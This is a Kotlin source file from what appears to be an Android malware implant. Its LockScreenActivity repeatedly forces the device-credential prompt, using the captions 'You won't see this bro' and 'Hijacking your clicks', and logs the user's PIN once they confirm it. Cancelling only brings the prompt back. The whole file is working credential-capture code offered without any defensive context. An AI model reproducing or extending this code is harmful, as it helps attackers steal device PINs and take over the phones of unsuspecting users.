package com.cooperthecoder.implant

import android.annotation.TargetApi
import android.app.Activity
import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.support.v7.app.AppCompatActivity
import android.util.Log
import android.view.WindowManager

class LockScreenActivity : AppCompatActivity() {

    companion object {
        val TAG: String = LockScreenActivity::class.java.name
        const val REQUEST_CODE_LOCK_SCREEN = 4
    }

    private val keyguardManager by lazy {
        getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
    }

    private var lastPin: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)
        Log.d(TAG, "In LockScreenActivity")
        lastPin = SharedPreferencesQuery.getNextPin(this)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            bringUpLockScreen()
        } else {
            // TODO: Find a way of doing this pre-Lollipop
            Log.d(TAG, "Bringing up lockscreen not possible pre-Lollipop")
        }
        finish()
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private fun bringUpLockScreen() {
        val flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
        val intent = keyguardManager.createConfirmDeviceCredentialIntent(
                "You won't see this bro",
                "Hijacking your clicks"
        )
        intent.flags = flags
        startActivityForResult(intent, REQUEST_CODE_LOCK_SCREEN)
        Log.d(TAG, "Bringing up lockscreen")
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == REQUEST_CODE_LOCK_SCREEN) {
            when (resultCode) {
                Activity.RESULT_OK -> {
                    Log.d(TAG, "User's PIN is $lastPin")
                }

                Activity.RESULT_CANCELED -> {
                    bringUpLockScreen()
                }
            }
        }
        super.onActivityResult(requestCode, resultCode, data)
    }
}
